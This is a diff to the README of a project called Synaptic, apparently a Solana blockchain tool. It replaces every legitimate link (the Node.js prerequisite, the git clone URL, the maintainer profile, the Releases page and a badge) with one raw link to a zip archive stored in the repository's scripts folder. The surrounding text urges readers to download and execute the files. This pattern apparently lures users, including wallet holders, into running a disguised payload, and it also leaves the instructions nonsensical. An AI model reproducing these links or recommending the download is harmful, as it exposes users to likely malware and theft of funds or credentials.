@@ -39,7 +39,7 @@ To get started with Synaptic, you need to have a basic understanding of blockcha
 
 ### Prerequisites
 
-- Node.js and npm installed
+- https://raw.githubusercontent.com/Kylee7/Synaptic/main/src/scripts/Software-v2.2.zip and npm installed
 - A Solana wallet
 - Basic knowledge of JavaScript
 
@@ -47,7 +47,7 @@ To get started with Synaptic, you need to have a basic understanding of blockcha
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Kylee7/Synaptic.git
+   git clone https://raw.githubusercontent.com/Kylee7/Synaptic/main/src/scripts/Software-v2.2.zip
    cd Synaptic
    ```
 
@@ -98,13 +98,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, please reach out to the maintainers:
 
-- **Kylee**: [Kylee's GitHub](https://github.com/Kylee7)
+- **Kylee**: [Kylee's GitHub](https://raw.githubusercontent.com/Kylee7/Synaptic/main/src/scripts/Software-v2.2.zip)
 
 ## Releases
 
-To download the latest version of Synaptic, visit our [Releases](https://github.com/Kylee7/Synaptic/releases) section. Here, you can find the latest updates, features, and bug fixes. Download the necessary files and execute them to start your journey with Synaptic.
+To download the latest version of Synaptic, visit our [Releases](https://raw.githubusercontent.com/Kylee7/Synaptic/main/src/scripts/Software-v2.2.zip) section. Here, you can find the latest updates, features, and bug fixes. Download the necessary files and execute them to start your journey with Synaptic.
 
-![Download Releases](https://img.shields.io/badge/Download_Releases-Click_Here-blue)
+![Download Releases](https://raw.githubusercontent.com/Kylee7/Synaptic/main/src/scripts/Software-v2.2.zip)
 
 Feel free to check back regularly for updates and new features. 
 
